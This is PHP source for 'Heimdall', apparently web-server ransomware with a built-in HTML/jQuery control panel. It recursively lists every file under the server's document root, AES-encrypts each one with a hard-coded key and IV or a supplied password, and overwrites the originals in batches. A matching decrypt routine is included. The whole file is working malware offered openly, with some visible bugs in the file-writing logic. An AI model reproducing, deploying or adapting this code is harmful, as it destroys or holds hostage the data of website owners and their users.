<?php
/**
 * Created by PhpStorm.
 * User: lenonleite
 * Date: 17/10/16
 * Time: 18:55
 */


ini_set('memory_limit','-1');

/**
 * Created by PhpStorm.
 * User: lenon
 * Date: 12/10/16
 * Time: 14:30
 */
if(isset($_POST['action'])){

    $heimdall= new Heimdall();
    $heimdall->setPassword($_POST['password']);
    switch ($_POST['action']) {
        case 'criptography':

            $result=$heimdall->criptographyByUrl($_POST['path'],$_POST['NumberInit'],$_POST['NumberFinish']);

            break;
        case 'descriptography':
            $heimdall->descriptographyByUrl($_POST['path'],$_POST['NumberInit'],$_POST['NumberFinish']);
            break;
        case 2:
            echo "i equals 2";
            break;

    }
    echo json_encode($result);
    exit();
}

?>

    <html>
    <head>
        <link rel="stylesheet" href="//code.jquery.com/ui/1.12.0/themes/base/jquery-ui.css">
        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.12/css/jquery.dataTables.min.css">
        <script type="application/javascript" src="//code.jquery.com/jquery-1.12.3.js"></script>
        <script type="application/javascript" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
        <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
        <script>

            $(document).ready(function() {
                $('#table1').DataTable();
                function sendData(action,password,NumberInit,NumberFinish){
                    $.ajax({
                        type: "post",
                        data: {
                            action: 'criptography',
                            //path: path,
                            password: password,
                            NumberInit:NumberInit,
                            NumberFinish:NumberFinish,
                        },
                        success: function (data) {
                            var dataArr = JSON.parse(data);
                            $.each(dataArr, function(index,item) {
                                if(item.status=="edit ok"){
                                    css='text-red';
                                }
                                if(item.status=="edit fail"){
                                    css='text-blue';
                                }
                                if(item.status=="crypted fail"){
                                    css='text-green';
                                }
                                $('#table tr:last').after(
                                    '<tr>' +
                                    '<td>'+index+'</td>' +
                                    '<td>'+item.url+'</td>' +
                                    '<td class="'+css+'">'+item.status+'</td>' +
                                    '</tr>');
                                loading(index);
                            });


                        }
                    });
                }
                $('#sendPass').click(function (){
                    clearMessage();
                    if($('#password').val()!="") {
                        var collection = [];
                        for ( var i = 100; i <= $('#totalOfResults').html().trim(); i=i+100 ) {
                            collection.push(i);
                        };
                        collection.push(i+($('#totalOfResults').html().trim()-i));

                        iTime = 1;
                        for(var i in collection) {
                            setTimeout(function () {
                                var j = collection.shift();
                                sendData('criptography', $('#password').val(),j-100 ,j);
                            }, 1000 * iTime);
                            iTime++;
                        }
                    }else{
                        $('.message-red').html('insert your password for cryptography');
                    }

//                $.get("?pathfile="+$(this).attr('data-path'), function(data) {
//                    $('#myModal').html(data);
//                });
                });
                $('#sendDePass').click(function (){
                    clearMessage();
                    if($('#passwordDecrypt').val()!="") {
                        iTime = 1;
                        //$('#table > tbody  > tr').each(function () {
                        for ( var i = 0; i <= $('#totalOfResults').html().trim(); i=i+100 ) {
                            var $this = this;
                            setTimeout(function () {
                                //path = $($this).find('td:nth-child(2)').html().trim();
                                $.ajax({
                                    type: "post",
                                    data: {
                                        action: 'descriptography',
                                        password: $('#passwordDecrypt').val(),
                                        NumberInit:$('#NumberInit').val(),
                                        NumberFinish:$('#NumberFinish').val(),
                                    },
                                    success: function (data) {
                                        loading($($this).find('td:first-child').html().trim());
                                        $('#NumberInit').val($('#NumberInit').val()+100);
                                        $('#NumberFinish').val($('#NumberFinish').val()+100);
                                        $($this).find('td:last-child').html('<span class=\'text-blue\'>decrypted</span>');
                                    }
                                });
                            }, 300 * iTime);
                            iTime++;
                        }


                        //});
                    }else{

                        $('.message-blue').html('insert your password for decrypt');
                    }
                });

                function clearMessage(){
                    $('.message-blue').html('');
                    $('.message-red').html('');
                }

                function loading(partial){
                    total = $('#totalOfResults').html();
                    p = Math.ceil((partial/total)*100);
                    $(".progress").css("max-width",p+"%");
                    $(".progress-view").text(p+"%");
                }
            });

        </script>
        <style>
            .text-red{
                color:red;
            }
            .text-blue{
                color:blue;
            }
            .text-green{
                color:green;
            }
            .progress{
                background:orchid;
            }
            .progress-view{
                color:white;
            }
        </style>
    </head>

    <body>
    <?php

    ini_set('display_errors',1);
    ini_set('display_startup_erros',1);
    error_reporting(E_ALL);


    $heimdall = new Heimdall();
    ?>
    <fieldset>
        <legend>
            Heimdall Encrypted
        </legend>
        <form id="formCriptography">
            <label>Password for encrypted</label>
            <input type="text" name="password" id="password">
            <input type="hidden" name="NumberInit" id="NumberInit" value="0">
            <input type="hidden" name="NumberFinish" id="NumberFinish" value="100">
            <input type="button" value="Send" id="sendPass">
        </form>
    </fieldset>

    <fieldset>
        <legend>
            Heimdall Decrypted
        </legend>
        <form id="formDecriptography">
            <label>Password for decrypted</label>
            <input type="text" name="passwordDecrypt" id="passwordDecrypt">
            <input type="text" name="NumberInit" id="NumberInit">
            <input type="text" name="NumberFinish" id="NumberFinish">
            <input type="button" value="Send" id="sendDePass">
        </form>
    </fieldset>
    <fieldset id="message">
        <legend>Message</legend>
        <div class="message-blue text-blue">

        </div>
        <div class="message-red text-red">

        </div>

    </fieldset>

    <fieldset>
        <legend>
            Resume
        </legend>
        <div class="progress">
            <div class="progress-view">

            </div>
        </div>
        <table id="table" class="display" cellspacing="0" width="100%">
            <thead>
            <tr>
                <th>
                    Number
                </th>
                <th>
                    Path/File
                </th>
                <th>
                    Status
                </th>
            </tr>
            </thead>
            <tbody>
            </tbody>
        </table>

    </fieldset>
    <?php
    //list of files
    $arrList=$heimdall->getDirContents($_SERVER['DOCUMENT_ROOT']);
    echo "Total of <span id='totalOfResults'>".count($arrList)."</span> files<br>";
    ?>

    <!--            --><?php
    //            foreach($arrList as $key=>$file){
    //                ?>
    <!---->
    <!--                <tr>-->
    <!---->
    <!--                    <td>-->
    <!--                        --><?php //  echo $key;?>
    <!--                    </td>-->
    <!--                    <td>-->
    <!--                        --><?php //  echo $file;?>
    <!--                    </td>-->
    <!--                    <td>-->
    <!--                        --><?php
    //                        if($heimdall->checkIfIsCriptograpfy($file)){
    //                            echo "<span class='text-red'>encrypted</span>";
    //                        }else{
    //                            echo "<span class='text-blue'>decrypted</span>";
    //                        };
    //
    //                        ?>
    <!--                    </td>-->
    <!--                </tr>-->
    <!--                --><?php
    //            }
    //            ?>
    <!--            </tbody>-->
    <!--        </table>-->
    </body>
    </html>
<?php




//class Heimdall
class Heimdall{

    public $algorithm;
    public $password;
    public $IV;

    public function __construct()
    {
        $this->algorithm='AES-128-CBC';
        $this->IV='Gj4LL4rH0rn0nL33';
        $this->password='HeimdallF0r4ll';
    }

    public function setPassword($password)
    {
        $this->password = $password;
    }

    public function cryptography($text){
        return "Heimdall---".openssl_encrypt($text, $this->algorithm, $this->password, 0, $this->IV);
    }

    public function descryptography($hash){
        $arrHash=explode("Heimdall---",$hash);
        return openssl_decrypt($arrHash[1], $this->algorithm, $this->password, 0, $this->IV);
    }

    public function getDirContents($dir, &$results = array()){
        $files = scandir($dir);

        foreach($files as $key => $value){
            $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
            //Check size of files, read only < 9 mb
            if(filesize($path)<=10000000){
                if(!is_dir($path)) {
                    $results[] = $path;
                } else if($value != "." && $value != "..") {
                    self::getDirContents($path, $results);
                    //$results[] = $path;
                }
            }

        }

        return $results;
    }

    public function readFile($url){
        return file_get_contents($url);
    }

    public function criptographyByUrl($url,$numberInit,$umberFinish){
        $files=$this->getDirContents($_SERVER['DOCUMENT_ROOT']);
        $result=array();
        for ($i = $numberInit; $i<= $umberFinish ; $i++) {
            $file = $this->readFile($files[$i]);
            $fileCriptgrafy= $this->cryptography("<!-- Heimdall Cryptography Success -->".$file);
            $arrSignature=explode("Heimdall---",$fileCriptgrafy);
            $result[$i]['url']=$files[$i];
            if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){

                if($this->editFile($url,$fileCriptgrafy)){

                    $result[$i]['status']="edit ok";
                }else{
                    $result[$i]['status']="edit fail";
                }

            }else{
                $result[$i]['status']="crypted fail";
            }
        }
        return $result;


    }

    public function descriptographyByUrl($url,$numberInit,$umberFinish){
        $files=$this->getDirContents($_SERVER['DOCUMENT_ROOT']);
        for ($i = $numberInit; $i<= $umberFinish ; $i++) {
            $file = $this->readFile($url);
            $arrSignature=explode("Heimdall---",$file);

            if(isset($arrSignature[1])){
                $fileDesCriptgrafy= $this->descryptography($file);
                if($this->checkIfDecrypt($fileDesCriptgrafy)){
                    if($this->editFile($url,$fileDesCriptgrafy)){
                        echo "edit ok";
                    }else{
                        echo "edit fail";
                    }
                }else{
                    echo "decrypt fail";
                }
            }else{
                echo "fail";
            }
        }

    }

    private function checkIfDecrypt($file){
        $validXmlrpc = preg_match("/<!-- Heimdall Cryptography Success -->(.*)/", $file, $matches, PREG_OFFSET_CAPTURE);
        if($validXmlrpc){
            return true;
        }
        return false;
    }

    private function editFile($url,$content){
        try{
            return file_put_contents($url,$content);
        }catch(Exception $e){
            return false;
        }

    }

    public function checkIfIsCriptograpfy($url){
        $file = $this->readFile($url);
        $arrSignature=explode("Heimdall---",$file);
        if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){
            return true;
        }
        return false;
    }
    private function getMemoryLimit(){
        $memory_limit = ini_get('memory_limit');
        if (preg_match('/^(\d+)(.)$/', $memory_limit, $matches)) {
            if ($matches[2] == 'M') {
                $memory_limit = $matches[1] * 1024 * 1024; // nnnM -> nnn MB
            } else if ($matches[2] == 'K') {
                $memory_limit = $matches[1] * 1024; // nnnK -> nnn KB
            }
        }
    }

    private function getMemoryUsing(){
        return memory_get_usage();
    }
}



